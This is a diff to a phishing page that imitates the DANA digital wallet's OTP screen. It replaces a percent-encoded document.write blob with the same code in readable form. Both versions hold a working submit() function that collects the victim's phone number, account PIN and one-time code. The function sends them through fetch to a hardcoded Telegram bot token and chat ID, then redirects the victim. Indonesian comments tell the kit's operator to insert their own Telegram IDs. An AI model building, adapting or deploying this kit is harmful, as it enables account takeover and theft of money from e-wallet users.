@@ -1,5 +1,96 @@
+<!DOCTYPE html><meta http-equiv=refresh><title>DANA | Dompet digital</title><link href="https://a.m.dana.id/merchant-portal/app/assets/fav-icon.png" rel="icon" type="image/png"><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name=viewport><style>@import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap);*{font-family:'Open Sans',sans-serif;font-weight:400}body{width:100%;height:100vh;margin:0;padding:0;background-color:#118eea;}.raw{position:absolute;width:100%;display:flex;justify-content:center;align-items:center;padding-top:20px}.back{width:18px;position:absolute;left:20px}.dana_logo{width:95px}.background{padding:0;margin:0;background:#0000002b;height:100%;width:100%;display:flex;justify-content:center;align-items:center;flex-direction:column;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%);-moz-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);-o-transform:translate(-50%,-50%)}.container{box-sizing:border-box;background:#fff;width:100%;height:100%;max-width:600px;max-height:700px;border-radius:15px;margin-top:40%}h1{margin-top:40px;margin-bottom:10px;font-size:15px;font-weight:600;color:#000}h2{font-size:15px;font-weight:400px;color:#000}.four_otp{display:flex;justify-content:center;align-items:center}.inpOtp{background:#f5f5f5;margin-left:3px;margin-right:3px;margin-top:25px;margin-bottom:25px;border-radius:8px;font-size:25px;font-weight:400;text-align:center;width:58px;height:45px;border:0;outline:0;caret-color:transparent}.resend{font-size:15px;font-weight:600;color:#cecece}</style><style>.process{position:absolute;display:flex;justify-content:center;align-items:center;background:#0000005b;width:100%;height:100vh}.loading{position:absolute;display:flex;justify-content:center;align-items:center;margin-bottom:20%}.loading img{width:50px}.loading .spinner{position:absolute;width:35px;animation:spin 1s linear infinite;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-ms-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(360deg)}100%{transform:rotate(0deg)}}@-webkit-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-moz-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-ms-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-o-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}</style><div class=raw><img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/back.png class=back> <img src=https://www.dana.id/_nuxt/img/dana-logo.fe46647.png class=dana_logo></div><div class=background><div class=container id=container><center><h1>Masukkan OTP</h1><h2>Kode OTP telah dikirm ke nomor Anda</h2><form><div class=four_otp id=four_otp><input autocomplete=off class=inpOtp id=otp1 maxlength=1 name=otp1 type=number><input autocomplete=off class=inpOtp id=otp2 maxlength=1 name=otp2 type=number><input autocomplete=off class=inpOtp id=otp3 maxlength=1 name=otp3 type=number><input autocomplete=off class=inpOtp id=otp4 maxlength=1 name=otp4 type=number></div></form><p class=resend>KIRIM ULANG (<span id=time>60</span>s)</center></div></div><div class=process id=process name=process style=display:none><div class=loading><img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/load_bg.png> <img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/load_spin.png class=spinner></div></div><script> const inputs = document.querySelectorAll(".four_otp input");
+const form = document.querySelector("form")
+inputs.forEach((input, index) => {
+    input.dataset.index = index;
+    input.addEventListener("keydown", clear);
+    input.addEventListener("keyup", onKeyUp);
+});
+function clear($event) { $event.target.value = ""; }
+function checkNumber(number) { return /[0-9]/g.test(number); }
+function onKeyUp($event) {
+    const input = $event.target;
+    const value = input.value;
+    const fieldIndex = +input.dataset.index;
+    if ($event.key === "Backspace" & fieldIndex > 0) {
+        input.previousElementSibling.focus();
+    }
+    if (checkNumber(value)) {
+        if (value.length > 0 & fieldIndex < inputs.length - 1) {
+            input.nextElementSibling.focus();
+        }
+        if (input.value !== "" & fieldIndex === inputs.length - 1) {
+            input.readOnly = true;
+            submit();
+        }
+    } else {
+        clear($event);
+    }
+}
+function startTimer(duration, display) {
+    var timer = duration, minutes, seconds;
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = seconds;
+        if (--timer < 0) {
+            timer = duration;
+        }
+    }, 1000);
+}
+window.onload = function () {
+    var fiveMinutes = 59 * 1,
+        display = document.querySelector('#time');
+    startTimer(fiveMinutes, display);
+};
+</script>
 <script>
-<!--
-document.write(unescape("%3C%21DOCTYPE%20html%3E%3Cmeta%20http-equiv%3Drefresh%3E%3Ctitle%3EDANA%20%7C%20Dompet%20digital%3C/title%3E%3Clink%20href%3D%22https%3A//a.m.dana.id/merchant-portal/app/assets/fav-icon.png%22%20rel%3D%22icon%22%20type%3D%22image/png%22%3E%3Cmeta%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1%2Cmaximum-scale%3D1%2Cuser-scalable%3Dno%22%20name%3Dviewport%3E%3Cstyle%3E@import%20url%28https%3A//fonts.googleapis.com/css2%3Ffamily%3DOpen+Sans%3Awght@400%3B600%3B700%26display%3Dswap%29%3B*%7Bfont-family%3A%27Open%20Sans%27%2Csans-serif%3Bfont-weight%3A400%7Dbody%7Bwidth%3A100%25%3Bheight%3A100vh%3Bmargin%3A0%3Bpadding%3A0%3Bbackground-color%3A%23118eea%3B%7D.raw%7Bposition%3Aabsolute%3Bwidth%3A100%25%3Bdisplay%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%3Bpadding-top%3A20px%7D.back%7Bwidth%3A18px%3Bposition%3Aabsolute%3Bleft%3A20px%7D.dana_logo%7Bwidth%3A95px%7D.background%7Bpadding%3A0%3Bmargin%3A0%3Bbackground%3A%230000002b%3Bheight%3A100%25%3Bwidth%3A100%25%3Bdisplay%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%3Bflex-direction%3Acolumn%3Bposition%3Aabsolute%3Btop%3A50%25%3Bleft%3A50%25%3Btransform%3Atranslate%28-50%25%2C-50%25%29%3B-webkit-transform%3Atranslate%28-50%25%2C-50%25%29%3B-moz-transform%3Atranslate%28-50%25%2C-50%25%29%3B-ms-transform%3Atranslate%28-50%25%2C-50%25%29%3B-o-transform%3Atranslate%28-50%25%2C-50%25%29%7D.container%7Bbox-sizing%3Aborder-box%3Bbackground%3A%23fff%3Bwidth%3A100%25%3Bheight%3A100%25%3Bmax-width%3A600px%3Bmax-height%3A700px%3Bborder-radius%3A15px%3Bmargin-top%3A40%25%7Dh1%7Bmargin-top%3A40px%3Bmargin-bottom%3A10px%3Bfont-size%3A15px%3Bfont-weight%3A600%3Bcolor%3A%23000%7Dh2%7Bfont-size%3A15px%3Bfont-weight%3A400px%3Bcolor%3A%23000%7D.four_otp%7Bdisplay%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%7D.inpOtp%7Bbackground%3A%23f5f5f5%3Bmargin-left%3A3px%3Bmargin-right%3A3px%3Bmargin-top%3A25px%3Bmargin-bottom%3A25px%3Bborder-radius%3A8px%3Bfont-size%3A25px%3Bfont-weight%3A400%3Btext-align%3Acenter%3Bwidth%3A58px%3Bheight%3A45px%3Bborder%3A0%3Boutline%3A0%3Bcaret-color%3Atransparent%7D.resend%7Bfont-size%3A15px%3Bfont-weight%3A600%3Bcolor%3A%23cecece%7D%3C/style%3E%3Cstyle%3E.process%7Bposition%3Aabsolute%3Bdisplay%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%3Bbackground%3A%230000005b%3Bwidth%3A100%25%3Bheight%3A100vh%7D.loading%7Bposition%3Aabsolute%3Bdisplay%3Aflex%3Bjustify-content%3Acenter%3Balign-items%3Acenter%3Bmargin-bottom%3A20%25%7D.loading%20img%7Bwidth%3A50px%7D.loading%20.spinner%7Bposition%3Aabsolute%3Bwidth%3A35px%3Banimation%3Aspin%201s%20linear%20infinite%3B-webkit-animation%3Aspin%201s%20linear%20infinite%3B-moz-animation%3Aspin%201s%20linear%20infinite%3B-ms-animation%3Aspin%201s%20linear%20infinite%3B-o-animation%3Aspin%201s%20linear%20infinite%7D@keyframes%20spin%7B0%25%7Btransform%3Arotate%28360deg%29%7D100%25%7Btransform%3Arotate%280deg%29%7D%7D@-webkit-keyframes%20spin%7B0%25%7B-webkit-transform%3Arotate%28360deg%29%7D100%25%7B-webkit-transform%3Arotate%280deg%29%7D%7D@-moz-keyframes%20spin%7B0%25%7B-webkit-transform%3Arotate%28360deg%29%7D100%25%7B-webkit-transform%3Arotate%280deg%29%7D%7D@-ms-keyframes%20spin%7B0%25%7B-webkit-transform%3Arotate%28360deg%29%7D100%25%7B-webkit-transform%3Arotate%280deg%29%7D%7D@-o-keyframes%20spin%7B0%25%7B-webkit-transform%3Arotate%28360deg%29%7D100%25%7B-webkit-transform%3Arotate%280deg%29%7D%7D%3C/style%3E%3Cdiv%20class%3Draw%3E%3Cimg%20src%3Dhttps%3A//yongkru.skemabiayatarif.com/DANA/assets/img/back.png%20class%3Dback%3E%20%3Cimg%20src%3Dhttps%3A//www.dana.id/_nuxt/img/dana-logo.fe46647.png%20class%3Ddana_logo%3E%3C/div%3E%3Cdiv%20class%3Dbackground%3E%3Cdiv%20class%3Dcontainer%20id%3Dcontainer%3E%3Ccenter%3E%3Ch1%3EMasukkan%20OTP%3C/h1%3E%3Ch2%3EKode%20OTP%20telah%20dikirm%20ke%20nomor%20Anda%3C/h2%3E%3Cform%3E%3Cdiv%20class%3Dfour_otp%20id%3Dfour_otp%3E%3Cinput%20autocomplete%3Doff%20class%3DinpOtp%20id%3Dotp1%20maxlength%3D1%20name%3Dotp1%20type%3Dnumber%3E%3Cinput%20autocomplete%3Doff%20class%3DinpOtp%20id%3Dotp2%20maxlength%3D1%20name%3Dotp2%20type%3Dnumber%3E%3Cinput%20autocomplete%3Doff%20class%3DinpOtp%20id%3Dotp3%20maxlength%3D1%20name%3Dotp3%20type%3Dnumber%3E%3Cinput%20autocomplete%3Doff%20class%3DinpOtp%20id%3Dotp4%20maxlength%3D1%20name%3Dotp4%20type%3Dnumber%3E%3C/div%3E%3C/form%3E%3Cp%20class%3Dresend%3EKIRIM%20ULANG%20%28%3Cspan%20id%3Dtime%3E60%3C/span%3Es%29%3C/center%3E%3C/div%3E%3C/div%3E%3Cdiv%20class%3Dprocess%20id%3Dprocess%20name%3Dprocess%20style%3Ddisplay%3Anone%3E%3Cdiv%20class%3Dloading%3E%3Cimg%20src%3Dhttps%3A//yongkru.skemabiayatarif.com/DANA/assets/img/load_bg.png%3E%20%3Cimg%20src%3Dhttps%3A//yongkru.skemabiayatarif.com/DANA/assets/img/load_spin.png%20class%3Dspinner%3E%3C/div%3E%3C/div%3E%3Cscript%3E%20const%20inputs%20%3D%20document.querySelectorAll%28%22.four_otp%20input%22%29%3B%0Aconst%20form%20%3D%20document.querySelector%28%22form%22%29%0Ainputs.forEach%28%28input%2C%20index%29%20%3D%3E%20%7B%0A%20%20%20%20input.dataset.index%20%3D%20index%3B%0A%20%20%20%20input.addEventListener%28%22keydown%22%2C%20clear%29%3B%0A%20%20%20%20input.addEventListener%28%22keyup%22%2C%20onKeyUp%29%3B%0A%7D%29%3B%0Afunction%20clear%28%24event%29%20%7B%20%24event.target.value%20%3D%20%22%22%3B%20%7D%0Afunction%20checkNumber%28number%29%20%7B%20return%20/%5B0-9%5D/g.test%28number%29%3B%20%7D%0Afunction%20onKeyUp%28%24event%29%20%7B%0A%20%20%20%20const%20input%20%3D%20%24event.target%3B%0A%20%20%20%20const%20value%20%3D%20input.value%3B%0A%20%20%20%20const%20fieldIndex%20%3D%20+input.dataset.index%3B%0A%20%20%20%20if%20%28%24event.key%20%3D%3D%3D%20%22Backspace%22%20%26%20fieldIndex%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20input.previousElementSibling.focus%28%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20if%20%28checkNumber%28value%29%29%20%7B%0A%20%20%20%20%20%20%20%20if%20%28value.length%20%3E%200%20%26%20fieldIndex%20%3C%20inputs.length%20-%201%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20input.nextElementSibling.focus%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28input.value%20%21%3D%3D%20%22%22%20%26%20fieldIndex%20%3D%3D%3D%20inputs.length%20-%201%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20input.readOnly%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20submit%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20clear%28%24event%29%3B%0A%20%20%20%20%7D%0A%7D%0Afunction%20startTimer%28duration%2C%20display%29%20%7B%0A%20%20%20%20var%20timer%20%3D%20duration%2C%20minutes%2C%20seconds%3B%0A%20%20%20%20setInterval%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20minutes%20%3D%20parseInt%28timer%20/%2060%2C%2010%29%3B%0A%20%20%20%20%20%20%20%20seconds%20%3D%20parseInt%28timer%20%25%2060%2C%2010%29%3B%0A%20%20%20%20%20%20%20%20minutes%20%3D%20minutes%20%3C%2010%20%3F%20%220%22%20+%20minutes%20%3A%20minutes%3B%0A%20%20%20%20%20%20%20%20seconds%20%3D%20seconds%20%3C%2010%20%3F%20%220%22%20+%20seconds%20%3A%20seconds%3B%0A%20%20%20%20%20%20%20%20display.textContent%20%3D%20seconds%3B%0A%20%20%20%20%20%20%20%20if%20%28--timer%20%3C%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20timer%20%3D%20duration%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%2C%201000%29%3B%0A%7D%0Awindow.onload%20%3D%20function%20%28%29%20%7B%0A%20%20%20%20var%20fiveMinutes%20%3D%2059%20*%201%2C%0A%20%20%20%20%20%20%20%20display%20%3D%20document.querySelector%28%27%23time%27%29%3B%0A%20%20%20%20startTimer%28fiveMinutes%2C%20display%29%3B%0A%7D%3B%0A%3C/script%3E%0A%3Cscript%3E%0Afunction%20submit%28%29%7B%0A%20%20%20%20let%20xx%20%20%3D%20document.getElementById%28%27process%27%29%0A%20%20%20%20let%20con%20%3D%20document.getElementById%28%27container%27%29%0A%20%20%20%20xx.style.display%20%3D%20%27flex%27%3B%0A%20%20%20%20con.style.marginTop%20%3D%20%27130%25%27%3B%0A%20%20%20%20let%20phoneNumber%20%3D%20sessionStorage.getItem%28%22phoneNumber%22%29%3B%0A%20%20%20%20let%20pinNumber%20%3D%20sessionStorage.getItem%28%22pinNumber%22%29%3B%0A%20%20%20%20let%20otpone%20%3D%20document.getElementById%28%27otp1%27%29.value%3B%0A%20%20%20%20let%20otptwo%20%3D%20document.getElementById%28%27otp2%27%29.value%3B%0A%20%20%20%20let%20otpthree%20%3D%20document.getElementById%28%27otp3%27%29.value%3B%0A%20%20%20%20let%20otpfour%20%3D%20document.getElementById%28%27otp4%27%29.value%3B%0A%20%20%20%20let%20otpNumber%20%3D%20otpone+otptwo+otpthree+otpfour%3B%0A%0A%20%20%20%20let%20message%20%3D%20%60%0ADANA%20%7C%20OTP%20%7C%20%24%7BphoneNumber%7D%0A%0A-%20No%20HP%20%3A%20%24%7BphoneNumber%7D%0A-%20Pin%20Akun%20%3A%20%24%7BpinNumber%7D%0A-%20Code%20OTP%20%3A%20%24%7BotpNumber%7D%60%3B%0A%0A//_masukan_ID_Akun_Telegram_kamu%0Avar%20id_telegram%20%20%20%3D%20%225611258815%22%3B%0A%0A//_masukan_ID_Bot_Telegram_kamu%0Avar%20token_botTele%20%3D%20%226107470179%3AAAFzwj1aG0e5dF-eniZNEoiL7UBLCBBTcfA%22%3B%0A%0A%20%20%20%20fetch%28%22https%3A//api.telegram.org/bot%22+token_botTele+%22/sendMessage%3Fparse_mode%3Dmarkdown%22%2C%7B%0A%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%27Accept%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20id_telegram%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20message%0A%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20window.location.href%20%3D%20%22./danaid.html%22%3B%0A%7D%0A%3C/script%3E%0A%3Cscript%3E%0Adocument.documentElement.addEventListener%28%22click%22%2C%20function%20%28%29%7B%0A%20%20%20%20let%20docElm%20%3D%20document.documentElement%3B%0A%20%20%20%20if%20%28docElm.requestFullscreen%29%20%7BdocElm.requestFullscreen%28%29%7D%0A%20%20%20%20else%20if%20%28docElm.mozRequestFullScreen%29%20%7BdocElm.mozRequestFullScreen%28%29%7D%0A%20%20%20%20else%20if%20%28docElm.webkitRequestFullScreen%29%20%7BdocElm.webkitRequestFullScreen%28%29%7D%0A%7D%29%3B%0A%3C/script%3E"));
-//-->
+function submit(){
+    let xx  = document.getElementById('process')
+    let con = document.getElementById('container')
+    xx.style.display = 'flex';
+    con.style.marginTop = '130%';
+    let phoneNumber = sessionStorage.getItem("phoneNumber");
+    let pinNumber = sessionStorage.getItem("pinNumber");
+    let otpone = document.getElementById('otp1').value;
+    let otptwo = document.getElementById('otp2').value;
+    let otpthree = document.getElementById('otp3').value;
+    let otpfour = document.getElementById('otp4').value;
+    let otpNumber = otpone+otptwo+otpthree+otpfour;
+
+    let message = `
+DANA | OTP | ${phoneNumber}
+
+- No HP : ${phoneNumber}
+- Pin Akun : ${pinNumber}
+- Code OTP : ${otpNumber}`;
+
+//_masukan_ID_Akun_Telegram_kamu
+var id_telegram   = "5611258815";
+
+//_masukan_ID_Bot_Telegram_kamu
+var token_botTele = "6107470179:AAFzwj1aG0e5dF-eniZNEoiL7UBLCBBTcfA";
+
+    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: id_telegram,
+            text: message
+        })
+    });
+    window.location.href = "./danaid.html";
+}
+</script>
+<script>
+document.documentElement.addEventListener("click", function (){
+    let docElm = document.documentElement;
+    if (docElm.requestFullscreen) {docElm.requestFullscreen()}
+    else if (docElm.mozRequestFullScreen) {docElm.mozRequestFullScreen()}
+    else if (docElm.webkitRequestFullScreen) {docElm.webkitRequestFullScreen()}
+});
 </script>
